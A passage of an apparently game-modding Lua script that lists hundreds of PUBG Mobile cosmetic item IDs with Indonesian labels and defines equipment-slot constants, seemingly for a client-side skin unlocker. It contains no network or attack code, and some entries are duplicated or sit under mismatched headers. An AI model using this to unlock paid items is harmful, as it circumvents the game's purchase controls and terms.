    4151126, -- Kapal Layang Hiburan
    4151127, -- Kapal Layang Pohon Abadi
    4151128, -- Kapal Layang Cahaya Dewa
    4151129, -- Papan Seluncur Rantai Musim (2026H1)
    4151130, -- Kapal Layang Nue
    4151131, -- Kapal Layang Phoenix Kaisar
    4151132, -- Kapal Layang Burung Hitam Darah
    4151133, -- Kapal Layang Teleportasi
    4151134, -- Kapal Layang Multiverse
    4151135, -- SAKAMOTO TARO Glider
    4151138, -- Kapal Layang Petir Merah
    4151139, -- Kapal Layang Kekosongan
    4151140, -- Kapal Layang Kembar
    4151141, -- Kapal Layang Cerberus
    4151142, -- Kapal Layang Mutiara
    4151143, -- Kapal Layang Kembar
    4152031, -- Kapal Layang Raja Darah
    4152035, -- Awan Terbang
    4152036, -- Windborne Euphony Glider
    4152037, -- Papan Seluncur Mesin Gelombang
    4152038, -- Papan Seluncur SIKLUS 5
    4152039, -- Kapal Layang Mutiara Sempurna
    4152041, -- Boxerbolt Hoverboard (Toko)
    4152042, -- Blueyonder Glider
    4152043, -- Agile Charmer Glider
    4152044, -- Agile Charmer Glider
    4152045, -- Chilly Perch Glider
    4152046, -- Foxy Flare Hoverboard
    4152058, -- LINE FRIENDS Glider (Toko)
    4152059, -- Cloud Piercer Hoverboard (Toko)
    4152060, -- Golden Wings Glider (Toko)
    4152061, -- Papan Seluncur SIKLUS 6 (Toko)
    4152063, -- Kapal Layang Bond SPY×FAMILY (Toko)
    4152066, -- Kapal Layang Raja Alam (Toko)
    4152067, -- Kapal Layang Kaleidoskop (Toko)
    4152068, -- Kapal Layang Raja Duri Beracun (Toko)
    4152069, -- Kapal Layang Nebula Petir (Toko)
    4152070, -- Kapal Layang Ksatria Dewa (Toko)
    4152076, -- Kapal Layang Dewa Sembilan Angin (Toko)
    4152077, -- Kapal Layang (Toko)
    4152078, -- Kapal Layang Kuda Laut Besi (Toko)
    4152079, -- Kapal Layang Sayap Dunia Bawah (Toko)
    4152080, -- Papan Seluncur SIKLUS 7 (Toko)
    4152092, -- Kapal Layang Singa Biru Bintang (Toko)
    4152093, -- Kapal Layang Serigala Giok (Toko)
    4152094, -- Papan Seluncur SIKLUS 8 (Toko)
    4152095, -- Kapal Layang Sayap Anukhra
    4152096, -- Kapal Layang Sayap Firaun
    4152097, -- Kapal Layang Monster Ghidorah
    4152098, -- Kapal Layang Waktu Berubah
    4152099, -- Kapal Layang Kekuasaan Gelap
    4152116, -- Kapal Layang Naga Suci (Lobi Satu Orang)

    -- ==============================================================================
    -- 3. PAKAIAN (OUTFITS), X-SUIT & AKSESORIS
    -- ==============================================================================
    -- [ X-SUIT ]
    1907076, -- B.Duck Tub Buggy
1907077, -- Goldcharm Hunt Buggy

1908121, -- Lincoln Navigator Black Label (Mystic Abyss)
1908122, -- Lincoln Navigator Black Label (Frosted Fig)
1908123, -- Scorpius Gem UAZ

1908124, -- Nightrose Cruise UAZ (Lv. 1)
1908125, -- Nightrose Cruise UAZ (Lv. 2)
1908126, -- Nightrose Cruise UAZ (Lv. 3)
1908127, -- Nightrose Cruise UAZ (Lv. 4)
1908128, -- Scorpius Gem UAZ
    1408052, -- Voodoo Scarecrow Set
1408053, -- Midnight Thorns Set
1408054, -- Shiba Explorer Set
1408055, -- The Strongest Man on Earth Set
1408056, -- Saitama Character Set
1408057, -- Genos Character Set
1408058, -- Terrible Tornado Character Set
1408059, -- Hellish Blizzard Character Set
1408060, -- Garou Ver.1 Character Set
1408061, -- Garou Ver.2 Character Set
1408062, -- Bound Rose Set
1408063, -- Ordinary Hero Set
1408064, -- Watchdog Man Character Set
1408065, -- Metropia Hunter Set
1408066, -- Dark Gallantry Set
1408067, -- B.Duck Summer Splash Set
1408068, -- Dungeon Bandit Set
1408069, -- Nightingale Assassin Set
1408070, -- Revenant Puppet Set
1408071, -- Wakala Set
1408072, -- Suzzanna-Sundel Bolong Set
1408073, -- Orbital Rider Set
1408074, -- Umbral Scorpius Set
1408075, -- Umbral Scorpius Set
1408076, -- Cosmic Steward Set
1408077, -- Starlight Sentinel Set
1408078, -- Platinum Soulmeister Set
1408079, -- Sanguine Sonata Set
1408080, -- Speedy Departure Set
1408081, -- Frenzied Wolfguard Set
1408082, -- Exoframe Drifter Set (Lv. 1)
1408083, -- Exoframe Drifter Set (Lv. 2)
1408084, -- Exoframe Drifter Set (Lv. 3)
1408085, -- Fearless Battlestriker Set
1408086, -- Renegade Tracker Set
1408087, -- Lady Darkrose Set
1408088, -- Lady Redrose Set
1408089, -- Skele Stealth Set
1408090, -- Kuzuha Vampire Knight Set
1408091, -- Team Korea of Esports Uniform - Asian Games 2026 Edition
1408092, -- Black Lotus Grim Reaper Set
1408093, -- King's Dragon Robe Set
1408094, -- Black Lotus Hanbok Set
1408095, -- Millennium Hwarang Set
1408096, -- Azure Featherdancer Set
1408097, -- Gem Charm Dancer Set
1408098, -- Sun Tulip Set
1408099, -- Wild Wolfspirit Set
1408100, -- Desert Rider Set
1408101, -- Desert Flowers Set
1408102, -- Crimson Spirit Bunny Set
1408103, -- Gentleman Set
1408104, -- Carefree Nation Set
1408105, -- Pumpkin Phantom Set
1408106, -- S32 Set
    1407895, -- X-Suit Gagak Darah (7 Bintang)
    1407856, -- X-Suit Phoenix (7 Bintang)
    1405628, -- X-Suit Firaun Emas (6 Bintang)
    1406469, -- X-Suit Firaun Emas (7 Bintang)
    1405870, -- X-Suit Gagak Darah (6 Bintang)
    1407140, -- X-Suit Poseidon (7 Bintang)
    1407142, -- X-Suit Silvanus (7 Bintang)
    1407141, -- X-Suit Badai Salju (7 Bintang)
    1407550, -- X-Suit Cahaya Pelangi (7 Bintang)
    1406638, -- X-Suit Badut Misterius (6 Bintang) [Hitam]
    1406641, -- X-Suit Badut Misterius (6 Bintang) [Putih]
    1406872, -- X-Suit Raja Neraka (7 Bintang)
    1406971, -- X-Suit Marmoris (7 Bintang)
    1407103, -- X-Suit Fiore (7 Bintang)
    1407219, -- X-Suit Ignis (7 Bintang)
    1407366, -- X-Suit Galadria (7 Bintang)
    1407512, -- X-Suit Anukhra (7 Bintang)
    1407625, -- X-Suit Dravion (7 Bintang) [Pria]
    1407667, -- X-Suit Dravion (7 Bintang) [Wanita]

    -- [ OUTFITS ]
    1407870, -- Pakaian Dewi Luar Angkasa
    1407871, -- Pakaian Detektif Multiverse
    1407812, -- Pakaian Penjaga Liar
    1407758, -- Pakaian Peri Musim Dingin
    1407286, -- Pakaian Kucing Cyber Nakal
    1407329, -- Pakaian Cahaya Tenang
    1407391, -- Pakaian Countess Vampir
    1407392, -- Pakaian Penghancur Biadab
    1407387, -- Pakaian Kematian Kiamat
    1407440, -- Pakaian Penakluk Kutub Utara
    1406985, -- Pakaian Kekasih Pantai
    1407470, -- Pakaian Malaikat Pemberontak
    1407471, -- Pakaian Aurora Taring Giok
    1407522, -- Pakaian Keturunan Dewa Pasir
    1407330, -- Pakaian Laksamana Hantu
    1407523, -- Pakaian Kekuasaan Jahat
    1407558, -- Pakaian Matahari Terbit
    1407559, -- Pakaian Cahaya Bulan
    1407572, -- Pakaian Malam Berdarah
    1407682, -- Pakaian Pertapa
    1407695, -- Pakaian Kekasih Menyeramkan
    1407696, -- Pakaian Prisma Naik
    1407632, -- Pakaian Malam Jahat
    1407573, -- Pakaian Hantu Digital
    1406398, -- Pakaian Hantu Berkobar
    1406399, -- Pakaian Ksatria Gagah
    1406482, -- Pakaian Raja Duri
    1406483, -- Pakaian Nebula Petir
    1406555, -- Pakaian Wajah Neraka
    1406573, -- Pakaian Angsa Hantu
    1406574, -- Pakaian Hakim Luar Angkasa
    1406656, -- Pakaian Siang Berdarah
    1406657, -- Pakaian Laksamana Bintang Laut
    1406742, -- Pakaian Guru Perak
    1406744, -- Pakaian Ksatria Matahari
    1406789, -- Pakaian Hantu Neraka
    1406823, -- Pakaian Tetesan Bulan Abadi
    1406824, -- Pakaian Musuh Berdarah
    1406897, -- Pakaian Mimpi Buruk Merah Tua
    1407277, -- Pakaian Dewa Api Kuno
    1406891, -- Pakaian Jiwa Mumi
    1405623, -- Pakaian Mumi Emas
    1400687, -- Pakaian Mumi Putih
    1407618, -- Pakaian Roh Kutub Utara (Polar Spectrophage)

    -- [ Dragon Ball Super Collab ]
    1406937, -- Pakaian Karakter Super Saiyan Son Goku
    1406938, -- Pakaian Karakter Frieza
    1406939, -- Pakaian Karakter Son Goku
    1406947, -- Pakaian Karakter Vegeta
    1406948, -- Pakaian Karakter Super Saiyan Vegeta
    1406950, -- Pakaian Beerus
    1406951, -- Pakaian Majin Buu
    1406952, -- Pakaian Kame Sennin
    1406953, -- Pakaian Karakter Gohan Super
    1406954, -- Pakaian Karakter Piccolo
    1407264, -- Pakaian Karakter Vegito
    1407265, -- Pakaian Karakter Vegito Super Saiyan
    1407266, -- Pakaian Karakter Vegito Super Saiyan Biru
    1407267, -- Pakaian Karakter Son Goku Super Saiyan Biru
    1407268, -- Pakaian Karakter Son Goku Super Saiyan Biru (Terluka)
    1407269, -- Pakaian Karakter Vegeta Super Saiyan Biru
    1407270, -- Pakaian Karakter Vegeta Super Saiyan Biru (Terluka)
    1407271, -- Pakaian Karakter Bulma

    -- [ Evangelion Collab ]
    1406385, -- Plugsuit Evangelion Shinji
    1406386, -- Plugsuit Evangelion Rei
    1406387, -- Plugsuit Evangelion Asuka
    1406388, -- Plugsuit Evangelion Mari
    1406389, -- Plugsuit Evangelion Kaworu

    -- [ Attack on Titan Collab ]
    1407563, -- Pakaian Karakter Eren Jaeger
    1407565, -- Pakaian Karakter Mikasa Ackermann
    1407566, -- Pakaian Karakter Armin Arlelt
    1407567, -- Pakaian Titan Raksasa (Armin)
    1407568, -- Pakaian Karakter Levi
    1407569, -- Pakaian Titan Baja

    -- [ Kaiju No. 8 Collab ]
    1407672, -- Pakaian Karakter Kafka Hibino
    1407673, -- Pakaian Kaiju No. 8
    1407674, -- Pakaian Karakter Kikoru Shinomiya
    1407675, -- Pakaian Kaiju No. 9
    1407676, -- Pakaian Kaiju No. 10
    1407677, -- Pakaian Karakter Mina Ashiro
    1407678, -- Pakaian Karakter Reno Ichikawa
    1407679, -- Pakaian Karakter Soshiro Hoshina

    -- [ BlackPink & Kpop Collabs ]
    1406132, -- Pakaian DDU-DU DDU-DU ROSÉ
    1406133, -- Pakaian DDU-DU DDU-DU JENNIE
    1406134, -- Pakaian DDU-DU DDU-DU JISOO
    1406135, -- Pakaian DDU-DU DDU-DU LISA
    1406161, -- Pakaian How You Like That ROSÉ
    1406162, -- Pakaian How You Like That JENNIE
    1406163, -- Pakaian How You Like That JISOO 
    1406164, -- Pakaian How You Like That LISA
    1406178, -- Pakaian Lovesick Girls ROSÉ
    1406179, -- Pakaian Lovesick Girls JENNIE
    1406180, -- Pakaian Lovesick Girls JISOO
    1406181, -- Pakaian Lovesick Girls LISA
    1407346, -- PUBGM X NewJeans MINJI Set
    1407347, -- PUBGM X NewJeans HANNI Set
    1407348, -- PUBGM X NewJeans HAERIN Set
    1407349, -- PUBGM X NewJeans DANIELLE Set
    1407350, -- PUBGM X NewJeans HYEIN Set
    1407745, -- Pakaian RAMI (Babymonster)
    1407746, -- Pakaian ASA (Babymonster)
    1407747, -- Pakaian AHYEON (Babymonster)
    1407748, -- Pakaian RORA (Babymonster)
    1407749, -- Pakaian CHIQUITA (Babymonster)
    1407750, -- Pakaian PHARITA (Babymonster)
    1407751, -- Pakaian RUKA (Babymonster)
    1407826, -- Pakaian PUBG MOBILE × aespa KARINA
    1407827, -- Pakaian PUBG MOBILE × aespa GISELLE
    1407828, -- Pakaian PUBG MOBILE × aespa WINTER
    1407829, -- Pakaian PUBG MOBILE × aespa NINGNING
    1407687, -- Pakaian G-DRAGON PEACEMINUSONE
    1407688, -- Pakaian Panggung G-DRAGON

    -- [ COLLAB LAINNYA YANG TERKENAL (Messi, Bruce Lee, SPYxFAMILY...) ]
    1406648, -- Pakaian Ikon Sepak Bola Messi
    1406649, -- Pakaian Legenda Bintang Messi
    1406728, -- Pakaian Kung Fu Bruce Lee
    1406729, -- Pakaian Ahli Pertarungan Jarak Dekat Bruce Lee
    1406730, -- Pakaian Naga Mengaum Bruce Lee
    1406731, -- Pakaian Petarung Bruce Lee
    1407206, -- SPY×FAMILY Pakaian Twilight
    1407401, -- Set C.C.
    1407402, -- Set Kallen Kozuki
    1407404, -- Set Suzaku Kururugi
    1407405, -- Set ZERO
    1407408, -- Set Kaisar Lelouch
    1407769, -- Set Okarun(bertransformasi)
    1407770, -- Set Okarun
    1407771, -- Set Momo
    1407772, -- Set Jiji(bertransformasi)
    1407773, -- Set Aira
    1407794, -- Pakaian Karakter John Shelby
    1407795, -- Pakaian Karakter Arthur Shelby
    1407796, -- Pakaian Thomas Shelby
    1407798, -- Pakaian Karakter Iori Yagami
    1407800, -- Pakaian Karakter Mai Shiranui
    1407801, -- Pakaian Karakter Nakoruru
    1407846, -- Pakaian Karakter Kimono Ryomen Sukuna
    1407848, -- Pakaian Karakter Suguru Geto
    1407901, -- Pakaian Karakter Isagi Yoichi
    1407902, -- Pakaian Karakter Bachira Meguru

    -- [ SET PAKAIAN MERAH ALAMI & SUPER VIP DARI GAME ]
    1405160, -- Legenda Godzilla
    1405161, -- Monster Ghidorah
    1405186, -- Pakaian Godzilla
    1405662, -- Pakaian Baju Zirah Samurai
    1405663, -- Pakaian Pembunuh Bayangan
    1406020, -- Pakaian Monster
    1406398, -- Pakaian Baju Zirah Api
    1406399, -- Pakaian Ksatria Dewa
    1406456, -- Pakaian Pahlawan Legenda
    1406568, -- Pakaian Ratu Malam
    1406569, -- Pakaian Raja Penghakiman
    1406732, -- Pakaian Ratu Emas
    1406733, -- Pakaian Kaisar Emas
    1406764, -- Pakaian Gadis Merah

    -- ==============================================================================
    -- 4. BAJU, CELANA, SEPATU KEREN & TDM (GAYA KEREN)
    -- ==============================================================================
    -- [ BAPE & ALAN WALKER ]
    1400569, -- BAPE MIX CAMO HOODIE
    1400650, -- BAPE MIX CAMO SHORTS
    1400651, -- BAPE STA MID
    1404000, -- BAPE City Camo Hoodie
    1404002, -- BAPE City Camo Pants
    1404003, -- BAPE Sta Mid
    1404048, -- Baju BAPE X PUBGM CAMO
    1404049, -- Hoodie Hiu BAPE X PUBGM CAMO
    1404050, -- Celana BAPE X PUBGM CAMO
    1404051, -- Sepatu BAPE X PUBGM CAMO
    1404016, -- Alan Walker T-shirt
    1404017, -- Alan Walker Hoodie
    1404042, -- Pakaian Alan Walker
    1404043, -- Baju Alan Walker
    1404044, -- Celana Alan Walker
    1404045, -- Sepatu Alan Walker
    1404340, -- Pakaian Alan Walker 2021
    1403038, -- Masker Alan Walker
    1403064, -- Masker Alan Walker

    -- [ PAKAIAN TDM POPULER (Masker, Baju Tentara, Jaket Hitam...) ]
    402001, -- Masker Selendang
    402037, -- Selendang Koboi
    402043, -- Selendang PUBG (Merah-Hitam)
    402045, -- Selendang PUBG (Taktis)
    1400158, -- Masker Hockey
    1402005, -- Masker Kulit Misterius
    1403100, -- Masker Pendaki
    403010, -- Kaos Kotor (Putih)
    403028, -- Jas Trench (Hitam)
    403181, -- Baju Tentara Gurun
    403182, -- Hoodie Pemburu (Hitam)
    403183, -- Hoodie Komando (Putih)
    403192, -- Jaket Bomber
    404006, -- Celana Jeans (Coklat)
    404008, -- Celana Tentara (Khaki)
    404013, -- Celana Tentara (Camouflage)
    404015, -- Celana Jeans Ketat (Biru)
    404026, -- Celana Kantong (Beige)
    404028, -- Celana Kantong (Hitam)
    404084, -- Celana Olahraga Pendek (Hitam)
    404100, -- Celana Penyembunyi (Hitam)
    405001, -- Sepatu Sol Lunak (Putih)
    405002, -- Sepatu Olahraga Tinggi
    405019, -- Sepatu Tentara Elang (Hitam)
    405044, -- Sepatu Sol Lunak (Hitam)
    1400013, -- Jeans Amerika

    -- [ BAJU LEPAS VIP (Collab, Super Car) ]
    1404142, -- Kaos THE WALKING DEAD (Putih)
    1404143, -- Kaos THE WALKING DEAD (Hitam)
    1404218, -- Hoodie COVERNAT (Putih)
    1404219, -- Hoodie COVERNAT (Hitam)
    1404326, -- Kaos Xiaomi
    1404327, -- Kaos OnePlus
    1404405, -- Jersey Kolaborasi Messi × PUBG MOBILE
    1404406, -- Kaos Bruce Lee
    1404411, -- Hoodie Ducati
    1404412, -- Sepatu Ducati Corse City C2
    1404413, -- Celana Ducati Sport C2
    1404414, -- Jaket Ducati Speed Evo C2
    1404426, -- Baju PMGC 2023
    1404427, -- Celana Penakluk Pagani
    1404428, -- Sepatu Penakluk Pagani
    1404508, -- Hoodie Mr.Beast
    1400324, -- baju b
    1400325, -- baju a
    452001, 452002, 452003, -- Sarung Tangan (Gloves)
    
        -- [ AKSI ]
        1103006084, -- Platinum Soulmeister - Mini14 (Lv. 7)
1105002106, -- Sanguine Sonata - DP-28 (Lv. 7)
1103012044, -- Bloodsurge Torrent - AMR (Lv. 5)
1102001143, -- Nebula Sting - UZI (Lv. 8)
1102001151, -- Starwoven Scorpion Blade - UZI (Lv. 8)
1101003233, -- Goldcharm Hunt - SCAR-L (Lv. 5)
    12201301, -- Aksi Pembunuh Gothic
    12216101, -- Aksi Petarung Elang Darah
    12212201, -- Aksi Pembunuh Kegelapan
    12219207, -- Aksi Jenderal Kerbau Langit
    12209001, -- Aksi Petarung (Samurai)
    12219561, -- Aksi Jubah Merah Tua
    12210001, -- Aksi Sentuhan Kematian
    12219022, -- Aksi Penjaga Berduri
    12208801, -- Aksi Prajurit Setengah Dewa
    12210801, -- Aksi Pemburu Cangkang Perak
    12200701, -- Aksi Perjalanan Waktu
    12219242, -- Aksi Jalan-jalan di Langit
    12206001, -- Aksi Bunga Biru
    12205401, -- Aksi Raja Segala Hewan
    12205201, -- Aksi Hati Monster
    12212601, -- Aksi Pembunuhan Misterius
    12205601, -- Aksi Jiwa Monster
    12219208, -- Aksi Monyet Cyber
    12212001, -- Aksi Raja Bela Diri
    12206801, -- Aksi Naga Laut Misterius
    12209801, -- Aksi Master Roh
    12211401, -- Aksi Penyihir Salju
    12207001, -- Aksi Perjalanan Bintang Laut
    12211801, -- Aksi Penguasa Ketertiban
    12207901, -- Aksi Raja Laut Memikat
    12203401, -- Aksi Kenangan Ilusi
    12204001, -- Aksi Badut (Hari April Mop)
    12201801, -- Aksi Penjaga Daerah Salju
    12215601, -- Aksi Manusia Super Bintang
    12215532, -- Aksi Penguasa Api
    12213201, -- Aksi Rencana Masa Depan
    12215529, -- Aksi Ksatria Balap
    12219053, -- Aksi Ratu Mutiara
    12204601, -- Aksi Dunia Bela Diri
    12215701, -- Aksi Planet Kera
    12219003, -- Aksi Kegelapan Dewa
    12219004, -- Aksi Jiwa Perak Berkobar
    12219009, -- Aksi Pesona Berkobar
    12219216, -- Aksi Imam Layu
    
    
    -- rambut wajah dll
    1404198, 1410085, 1404366, 1403137, 1410480, 1403028, 1400158, 40605011, 1404323, 1406001, 1403002,

-- ==============================================================================
    -- HELM VIP (HANYA AMBIL LEVEL 1 - RAPIH, MUDAH DISEMBUNYIKAN)
    -- ==============================================================================
    1502001183, -- Godzilla Helmet (Lv. 1)
    1502001194, -- Helm MECHAGODZILLA (Level 1)
    1502001093, -- Helm Hakim Anubis (Level 1) - Firaun
    1502001305, -- Helm Baja Manusia Super (Level 1)
    1502001320, -- Helm Baja Ikon Sepak Bola Messi (Level 1)
    1502001105, -- Helm Tembus Pandang (Level 1)
    1502001364, -- Helm Baja PMGC 2023 (Level 1)
    1502001373, -- Helm Baja LINE FRIENDS BROWN (Level 1)
    1502001402, -- APEACH Helmet (LV.1)
    1502001403, -- Bellygom Helmet (LV.1)
    1502001427, -- Opanchu Helmet (Lv.1)
    1502001443, -- Helm Gelombang Suara Kacau (Level 1)
    1502001450, -- Helm Anjing Nakal (Level 1)
    1502001471, -- Turbo Granny (Beckoning cat) Helmet (Lv. 1)
    1502001480, -- Helm PUBG MOBILE × aespa (Level 1)
    1502001490, -- Nakiri Ayame Helmet (Lv.1)
    1502001495, -- Helm BLUE LOCK (Level 1)
    1502001001, -- Helm Pizza Panas (Level 1)
    1502001004, -- Helm Cyberpunk (Ungu) (Level 1)
    1502001005, -- Helm Tengkorak (Level 1)
    1502001046, -- Helm Samurai - Kehormatan (Level 1)
    1502001058, -- Helm Monarch (Level 1)
    1502001064, -- Helm Malaikat (Level 1)
    1502001073, -- Helm Robot Penjaga (Level 1)
    1502001078, -- Helm Ninja Pembunuh (Level 1)
    1502001086, -- Helm Tikus Nakal (Level 1)
    1502001099, -- Helm Corgi (Level 1)
    1502001115, -- Helm Kumbang (Level 1)
    1502001133, -- Helm Labu Mengerikan (Level 1)
    1502001145, -- Helm Prajurit Timah (Level 1)
    1502001154, -- Helm Baja Elang Bersinar (Level 1)
    1502001175, -- Helm Bebek Kuning B.Duck (Level 1)
    1502001230, -- Helm Naga Teknologi (Level 1)
    1502001248, -- Helm Pembuka Jalan (Level 1)
    1502001264, -- Helm Tulisan Aneh (Level 1)
    1502001276, -- Helm Penari Misterius (Level 1)
    1502001294, -- Helm Baja Penyihir (Level 1)
    1502001301, -- Helm Baja Archon Megah (Level 1)
    1502001357, -- Helm Baja Son Goku (Level 1)
    1502001381, -- Helm Baja Roh Api Tertinggi (Level 1)
    1502001416, -- Helm Baja PMGC 2024 (Level 1)
    1502001453, -- 2025 Esports Helmet (Lv. 1)

    -- ==============================================================================
    -- RANSEL VIP (HANYA AMBIL LEVEL 1 - RAPIH, MUDAH DISEMBUNYIKAN)
    -- ==============================================================================
    1502001516, -- Midnight Thorns Helmet (Lv. 1)
1502001517, -- Shiba Explorer Helmet (Lv. 1)
1502001518, -- Saitama Helmet (Lv. 1)
1502001519, -- Metropia Hunter Helmet (Lv. 1)
1502001520, -- Chroma Frontline Helmet (Lv. 1)
1502001521, -- B.Duck Ducky Royale Helmet (Lv. 1)
1502001522, -- Orbital Rider Helmet (Lv. 1)
1502001523, -- Scorpius Gem Helmet (Lv. 1)
1502001524, -- Annihilation Pact Helmet (Lv. 1)
1502001525, -- Nightrose Aegis Helmet (Lv. 1)
1502001526, -- Kuzuha Helmet (Lv. 1)
1502001527, -- S32 Helmet (Lv. 1)

1502002516, -- Midnight Thorns Helmet (Lv. 2)
1502002517, -- Shiba Explorer Helmet (Lv. 2)
1502002518, -- Saitama Helmet (Lv. 2)
1502002519, -- Metropia Hunter Helmet (Lv. 2)
1502002520, -- Chroma Frontline Helmet (Lv. 2)
1502002521, -- B.Duck Ducky Royale Helmet (Lv. 2)
1502002522, -- Orbital Rider Helmet (Lv. 2)
1502002523, -- Scorpius Gem Helmet (Lv. 2)
1502002524, -- Annihilation Pact Helmet (Lv. 2)
1502002525, -- Nightrose Aegis Helmet (Lv. 2)
1502002526, -- Kuzuha Helmet (Lv. 2)
1502002527, -- S32 Helmet (Lv. 2)

1502003516, -- Midnight Thorns Helmet (Lv. 3)
1502003517, -- Shiba Explorer Helmet (Lv. 3)
1502003518, -- Saitama Helmet (Lv. 3)
1502003519, -- Metropia Hunter Helmet (Lv. 3)
1502003520, -- Chroma Frontline Helmet (Lv. 3)
1502003521, -- B.Duck Ducky Royale Helmet (Lv. 3)
1502003522, -- Orbital Rider Helmet (Lv. 3)
1502003523, -- Scorpius Gem Helmet (Lv. 3)
1502003524, -- Annihilation Pact Helmet (Lv. 3)
1502003525, -- Nightrose Aegis Helmet (Lv. 3)
1502003526, -- Kuzuha Helmet (Lv. 3)
1502003527, -- S32 Helmet (Lv. 3)
    1501002751, -- Midnight Thorns Backpack (Lv. 2)
1501002752, -- Shiba Explorer Backpack (Lv. 2)
1501002753, -- One-Punch Man Backpack (Lv. 2)
1501002754, -- Collector's Pride Backpack (Lv. 2)
1501002755, -- B.Duck Playful Collectibles Backpack (Lv. 2)
1501002756, -- Wakala Backpack (Lv. 2)
1501002757, -- Orbital Rider Backpack (Lv. 2)
1501002758, -- Scorpius Casket Backpack (Lv. 2)
1501002759, -- Soulbind Traveler Backpack (Lv. 2)
1501002760, -- Bloodrose Bond Backpack (Lv. 2)
1501002761, -- Annihilation Pact Backpack (Lv. 2)
1501002762, -- Cozy Coffin Backpack (Lv. 2)
1501002763, -- Kuzuha Backpack (Lv. 2)
1501002764, -- S32 Backpack (Lv. 2)

1501003751, -- Midnight Thorns Backpack (Lv. 3)
1501003752, -- Shiba Explorer Backpack (Lv. 3)
1501003753, -- One-Punch Man Backpack (Lv. 3)
1501003754, -- Collector's Pride Backpack (Lv. 3)
1501003755, -- B.Duck Playful Collectibles Backpack (Lv. 3)
1501003756, -- Wakala Backpack (Lv. 3)
1501003757, -- Orbital Rider Backpack (Lv. 3)
1501003758, -- Scorpius Casket Backpack (Lv. 3)
1501003759, -- Soulbind Traveler Backpack (Lv. 3)
1501003760, -- Bloodrose Bond Backpack (Lv. 3)
1501003761, -- Annihilation Pact Backpack (Lv. 3)
1501003762, -- Cozy Coffin Backpack (Lv. 3)
1501003763, -- Kuzuha Backpack (Lv. 3)
1501003764, -- S32 Backpack (Lv. 3)
    1501001751, -- Midnight Thorns Backpack (Lv. 1)
1501001752, -- Shiba Explorer Backpack (Lv. 1)
1501001753, -- One-Punch Man Backpack (Lv. 1)
1501001754, -- Collector's Pride Backpack (Lv. 1)
1501001755, -- B.Duck Playful Collectibles Backpack (Lv. 1)
1501001756, -- Wakala Backpack (Lv. 1)
1501001757, -- Orbital Rider Backpack (Lv. 1)
1501001758, -- Scorpius Casket Backpack (Lv. 1)
1501001759, -- Soulbind Traveler Backpack (Lv. 1)
1501001760, -- Bloodrose Bond Backpack (Lv. 1)
1501001761, -- Annihilation Pact Backpack (Lv. 1)
1501001762, -- Cozy Coffin Backpack (Lv. 1)
    1501001174, -- Ransel Firaun (Level 1)
    1501001220, -- Ransel Taring Darah (Level 1)
    1501001265, -- Ransel Poseidon (Level 1)
    1501001548, -- Ransel Mitologi Kuno (Level 1)
    1501001559, -- Ransel Ular Hijau (Level 1)
    1501001567, -- Ransel Roh Api Tertinggi (Level 1)
    1501001577, -- Ransel Sayap Malaikat (Level 1)
    1501001607, -- Ransel Kelelawar Malam (Level 1)
    1501001061, -- Ransel Godzilla (Level 1)
    1501001062, -- Ransel Monster Ghidorah (Level 1)
    1501001082, -- Ransel Genbu (Level 1)
    1501001112, -- Ransel Babi Bodoh (Level 1)
    1501001133, -- Ransel Joker Haus Darah (Level 1)
    1501001243, -- Ransel Bebek Kuning B.Duck (Level 1)
    1501001273, -- Ransel MECHAGODZILLA (Level 1)
    1501001304, -- Ransel Raja Iblis (Level 1)
    1501001331, -- Ransel Jinx (Level 1)
    1501001340, -- Ransel Anjing Laut Salju (Level 1)
    1501001376, -- Ransel Pemutar Musik Klasik (Level 1)
    1501001400, -- Ransel Baby Shark (Level 1)
    1501001463, -- Ransel BoBoiBoy (Level 1)
    1501001476, -- Ransel Ikon Sepak Bola Messi (Level 1)
    1501001480, -- Ransel Mie Indomie (Level 1)
    1501001487, -- Ransel Mata Mematikan (Level 1)
    1501001521, -- Ransel Kame Sennin (Level 1)
    1501001539, -- Ransel PMGC 2023 (Level 1)
    1501001540, -- Ransel Ayam Goreng KFC (Level 1)
    1501001554, -- Ransel LINE FRIENDS SALLY (Level 1)
    1501001587, -- Ransel Kapten Kekacauan (Level 1)
    1501001597, -- Bellygom Backpack (LV.1)
    1501001632, -- Opanchu Backpack (Lv.1)
    1501001643, -- Frieren&Mimic Backbag (Lv.1)
    1501001650, -- Ransel Titan Raksasa Level 1
    1501001683, -- Ransel Balenciaga (Level 1)
    1501001715, -- SAKAMOTO TARO Backpack (Lv.1)
    1501001720, -- Ransel BLUE LOCK (Level 1)
    
        -- [ RANSEL, HELM & LAYANG ]
    1501001024, -- Ransel Count
    1502001014, -- Helm Paku
    1502001439, -- helm mahkota
    1502001069, -- helm mayat hidup
    1502001023, -- helm es
    

    
    -- id tambahan
    1400092, 1400101, 1400122, --komandan
    1404191, -- celana jalan
    1405128, 1405129, 140224445, 140224445, -- kru
    1407961, 1407962, 1407963, 1407964, 1407965, 1407966, 1407967, 1407968, 1407969, 1407970, 1407971, 1502001508, 1502002508, 1502003508, 1411134, 1411133, 1411135, 1403771, 1403770, 1407994, 1407993, 1101006106, 1101006098, 4151145, 1903230, 1903231, 1903232, 1908117, 1908118, 1908119, 19116002, 19116003, 19116004, 1961070, 1961071, 1961072, 1961073, 1408045, 1408038, 1407990,
}

local INS_BASE = 2000000000
local PKG_SLOT = 3
local MELEE_ID = 108
local HAT_SUB = 401
local MASK_SUB = 402
local OUTFIT_SUB = 403
local PANTS_SUB = 404
local SHOES_SUB = 405
local GLASS_SUB = 407
local GLIDER_SUB = 415      
local GLOVES_SUB = 452
local GLIDER_SUBS = { [413] = true, [414] = true, [415] = true }

F.CUST_SLOT = {
    NONE = 0,
    HeadEquipemtSlot = 1,
    HairEquipemtSlot = 2,
    HatEquipemtSlot = 3,
    FaceEquipemtSlot = 4,
    ClothesEquipemtSlot = 5,
    PantsEquipemtSlot = 6,
    ShoesEquipemtSlot = 7,
    BackpackEquipemtSlot = 8,
    HelmetEquipemtSlot = 9,
    ArmorEquipemtSlot = 10,
    ParachuteEquipemtSlot = 11,
    GlassEquipemtSlot = 12,
    NightVisionEquipemtSlot = 13,
    BeardEquipemtSlot = 14,
    GlideEquipemtSlot = 15,
    HandEffectEquipemtSlot = 16,
    BackPack_PendantSlot = 17,
}
_G.CustSlotType = F.CUST_SLOT

local CHASSIS_LIGHT_SUB = 7302
local CHASSIS_LIGHT_IDS = { [7302001] = true, [7302002] = true }
local DEFAULT_CHASSIS_LIGHT = 7302002
local PARACHUTE_SUB = 701   
local DEFAULT_PARACHUTE_RES = 703001  
local TAB_SUIT = 10
local TAB_CLOTHES = 3
local PAGE_AVATAR = 1
local PAGE_VEHICLE = 6
local PAGE_PARACHUTE = 5
